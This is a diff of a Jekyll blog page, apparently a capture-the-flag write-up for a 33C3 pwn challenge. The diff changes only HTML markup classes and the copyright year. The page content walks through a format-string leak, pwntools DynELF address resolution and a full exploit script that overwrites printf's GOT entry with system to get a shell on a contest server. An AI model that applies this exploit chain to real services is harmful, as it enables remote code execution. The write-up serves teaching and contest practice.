@@ -305,7 +305,7 @@
 <!-- more -->
 
 <p>This time there’s no binary or libc.so provided, only an image looks like this:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 eat:                  sleep:
 +-----------------+   +----------------+
 | sub rsp, 0x100  |   | mov edi, 0x1   |
@@ -328,7 +328,7 @@ pwn:                  repeat:
 
 <p>So how are we gonna do this? Fortunately, <a href="https://github.com/Gallopsled/pwntools">pwntools</a> is here to rescue! <strong>By using the amazing <a href="http://docs.pwntools.com/en/stable/dynelf.html">DynELF</a> module, we’re able to resolve &amp; leak some address without the need for binary!</strong></p>
 
-<p>First we’ll need a <code class="highlighter-rouge">leak</code> function to let pwntools able to leak data at an arbitrary address. Here we exploit the format string vulnerability to leak an arbitrary address:</p>
+<p>First we’ll need a <code class="language-plaintext highlighter-rouge">leak</code> function to let pwntools able to leak data at an arbitrary address. Here we exploit the format string vulnerability to leak an arbitrary address:</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%7</span><span class="s">$s.AAA"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -336,12 +336,12 @@ pwn:                  repeat:
     <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">".AAA"</span><span class="p">)</span>
     <span class="n">ret</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
     <span class="k">print</span> <span class="s">"ret:"</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span> <span class="c"># receive the rest of the string</span>
-    <span class="k">return</span> <span class="n">ret</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span> <span class="c1"># receive the rest of the string
+</span>    <span class="k">return</span> <span class="n">ret</span>
 </code></pre></div></div>
-<p>Then we need a pointer into the binary. I got the pointer by entering <code class="highlighter-rouge">%30$p</code>, which returned <code class="highlighter-rouge">0x40060d</code>. Now we can use the <code class="highlighter-rouge">DynELF</code> module to help us resolve some function addresses.</p>
+<p>Then we need a pointer into the binary. I got the pointer by entering <code class="language-plaintext highlighter-rouge">%30$p</code>, which returned <code class="language-plaintext highlighter-rouge">0x40060d</code>. Now we can use the <code class="language-plaintext highlighter-rouge">DynELF</code> module to help us resolve some function addresses.</p>
 
-<p>First we’ll need to resolve the address of <code class="highlighter-rouge">printf</code> and <code class="highlighter-rouge">system</code>:</p>
+<p>First we’ll need to resolve the address of <code class="language-plaintext highlighter-rouge">printf</code> and <code class="language-plaintext highlighter-rouge">system</code>:</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mh">0x40060d</span><span class="p">)</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s">'system'</span><span class="p">,</span> <span class="s">'libc'</span><span class="p">)</span>
 <span class="n">printf_addr</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s">'printf'</span><span class="p">,</span> <span class="s">'libc'</span><span class="p">)</span>
@@ -350,20 +350,20 @@ pwn:                  repeat:
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 </code></pre></div></div>
 
-<p>It took a while because of <code class="highlighter-rouge">sleep(1)</code>, and pwntools will need a lot of addresses to resolve those functions.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] printf_addr: 0x7fb040a17550
+<p>It took a while because of <code class="language-plaintext highlighter-rouge">sleep(1)</code>, and pwntools will need a lot of addresses to resolve those functions.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] printf_addr: 0x7fb040a17550
 [+] system_addr: 0x7fb040a066d0
 </code></pre></div></div>
 
-<p>OK so now we know the offset between <code class="highlighter-rouge">printf</code> and <code class="highlighter-rouge">system</code>. Next time we’ll just have to leak <code class="highlighter-rouge">printf@got.plt</code>, calculate <code class="highlighter-rouge">system</code>’s address and use it to overwrite <code class="highlighter-rouge">printf</code>’s GOT entry, finally we’ll be able to hijack <code class="highlighter-rouge">printf</code>’s GOT and call <code class="highlighter-rouge">system("sh")</code> by entering “sh”.</p>
+<p>OK so now we know the offset between <code class="language-plaintext highlighter-rouge">printf</code> and <code class="language-plaintext highlighter-rouge">system</code>. Next time we’ll just have to leak <code class="language-plaintext highlighter-rouge">printf@got.plt</code>, calculate <code class="language-plaintext highlighter-rouge">system</code>’s address and use it to overwrite <code class="language-plaintext highlighter-rouge">printf</code>’s GOT entry, finally we’ll be able to hijack <code class="language-plaintext highlighter-rouge">printf</code>’s GOT and call <code class="language-plaintext highlighter-rouge">system("sh")</code> by entering “sh”.</p>
 
-<p>But first we’ll have to know the address of <code class="highlighter-rouge">printf@got.plt</code>. Luckily, not only can <code class="highlighter-rouge">DynELF</code> resolve function addresses, it can also resolve some useful addresses such as the pointer to the <code class="highlighter-rouge">.dynamic</code> section:</p>
+<p>But first we’ll have to know the address of <code class="language-plaintext highlighter-rouge">printf@got.plt</code>. Luckily, not only can <code class="language-plaintext highlighter-rouge">DynELF</code> resolve function addresses, it can also resolve some useful addresses such as the pointer to the <code class="language-plaintext highlighter-rouge">.dynamic</code> section:</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mh">0x40060d</span><span class="p">)</span>
 <span class="n">dynamic_ptr</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">dynamic</span>
 </code></pre></div></div>
 
-<p>Once we got the <code class="highlighter-rouge">.dynamic</code> section’s address, we can use it to locate the <code class="highlighter-rouge">.got.plt</code> area:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dynamic section at offset 0xe28 contains 24 entries:
+<p>Once we got the <code class="language-plaintext highlighter-rouge">.dynamic</code> section’s address, we can use it to locate the <code class="language-plaintext highlighter-rouge">.got.plt</code> area:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dynamic section at offset 0xe28 contains 24 entries:
   Tag        Type                         Name/Value
  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
  0x000000000000000c (INIT)               0x400400
@@ -384,8 +384,8 @@ pwn:                  repeat:
 <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
     <span class="n">addr</span> <span class="o">=</span> <span class="n">dynamic_ptr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="o">*</span><span class="n">cnt</span>
     <span class="n">ret</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">ret</span> <span class="o">==</span> <span class="s">"</span><span class="se">\x03\x00</span><span class="s">"</span><span class="p">:</span> <span class="c">#TYPE PLTGOT</span>
-        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">8</span>
+    <span class="k">if</span> <span class="n">ret</span> <span class="o">==</span> <span class="s">"</span><span class="se">\x03\x00</span><span class="s">"</span><span class="p">:</span> <span class="c1">#TYPE PLTGOT
+</span>        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">8</span>
         <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
             <span class="n">ret</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
             <span class="k">print</span> <span class="s">"ret:"</span><span class="p">,</span> <span class="n">ret</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
@@ -394,7 +394,7 @@ pwn:                  repeat:
         <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>
 </code></pre></div></div>
 
-<p>Now we can find where <code class="highlighter-rouge">printf@got.plt</code> is, by leaking all the GOT entry and compare the low 12 bits of the function address (see if it ends with <code class="highlighter-rouge">550</code>):</p>
+<p>Now we can find where <code class="language-plaintext highlighter-rouge">printf@got.plt</code> is, by leaking all the GOT entry and compare the low 12 bits of the function address (see if it ends with <code class="language-plaintext highlighter-rouge">550</code>):</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">got</span> <span class="o">=</span> <span class="mh">0x601000</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
     <span class="n">addr</span> <span class="o">=</span> <span class="n">got</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span>
@@ -403,8 +403,8 @@ pwn:                  repeat:
 </code></pre></div></div>
 
 <p>Finally, we can start exploiting the service:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -412,13 +412,13 @@ pwn:                  repeat:
 
 <span class="n">HOST</span> <span class="o">=</span> <span class="s">"78.46.224.86"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+<span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%7</span><span class="s">$s.AAA"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
@@ -436,8 +436,8 @@ pwn:                  repeat:
 
     <span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
     <span class="n">printf_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
-    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="mh">0x10e80</span> <span class="c"># remote</span>
-
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="mh">0x10e80</span> <span class="c1"># remote
+</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"printf_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">))</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 
@@ -455,7 +455,7 @@ pwn:                  repeat:
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">33C3_f1rst_tshirt_challenge?!</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">33C3_f1rst_tshirt_challenge?!</code></p>
 
         
       </section>
@@ -560,7 +560,6 @@ pwn:                  repeat:
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -580,7 +579,6 @@ pwn:                  repeat:
 
         
           
-          
 
 
 
@@ -599,7 +597,6 @@ pwn:                  repeat:
 </div>
 
         
-          
           
 
 
@@ -622,7 +619,6 @@ pwn:                  repeat:
 
         
           
-          
 
 
 
@@ -643,6 +639,7 @@ pwn:                  repeat:
         
       </div>
     </div>
+  
   
 </div>
 
@@ -693,7 +690,7 @@ pwn:                  repeat:
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
